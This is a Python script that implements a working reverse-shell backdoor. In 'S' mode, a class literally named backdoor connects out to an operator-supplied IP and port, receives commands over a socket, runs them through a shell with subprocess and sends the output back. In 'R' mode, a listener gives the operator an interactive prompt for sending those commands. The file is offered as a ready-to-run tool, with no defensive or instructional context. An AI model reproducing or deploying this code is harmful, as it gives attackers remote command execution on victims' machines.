import optparse
import socket
import subprocess


class Sender_N_Receiver:

    def __init__(self, ip, port, mode):
        self.ip = ip
        self.port = int(port)
        self.backd = self.backdoor
        self.listn = self.listener
        if mode == "S":
            self.backd(self.ip, self.port)
        else:
            self.listn(self.ip, self.port)

    class backdoor():

        def __init__(self, ip, port):
            self.status = True
            self.ip = ip
            self.port = port
            self.make_connection()

        def execute_commands(self, command_given):
            try:
                return subprocess.check_output(command_given, shell=True)
            except Exception:
                pass

        def make_connection(self):
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((self.ip, self.port))
            while self.status:
                command = connection.recv(1024)
                if command.decode('utf-8') == "close":
                    self.status = False
                    connection.close()
                    continue
                output = self.execute_commands(command.decode('UTF-8'))
                connection.send(output)

    class listener():

        def __init__(self, ip, port):
            self.status = True
            self.ip = ip
            self.port = port
            self.listener_start()

        def listener_start(self):
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind((self.ip, self.port))
            listener.listen(0)
            print("[+]waiting for connections...")
            connection, address = listener.accept()
            print("[+]got connection from " + str(address))
            while self.status:
                command = input(">> ")
                if command == "close":
                    connection.send(bytes(command, 'utf-8'))
                    self.status = False
                    connection.close()
                    continue
                connection.send(bytes(command, 'utf-8'))
                result = connection.recv(1024)
                print("\n" + result.decode('UTF-8'))


def get_arguments():
    arguments = optparse.OptionParser()
    arguments.add_option("-i", "--ip", metavar='\b', dest="ip", help="\tip-address")
    arguments.add_option("-p", "--port", metavar='\b', dest="port", help="\tport")
    arguments.add_option("-m", "--mode", metavar='\b', dest="mode", help="\tmode[ S - send, R - recieve]")
    values, options = arguments.parse_args()
    return values


values = get_arguments()
snr = Sender_N_Receiver(values.ip, values.port, values.mode)
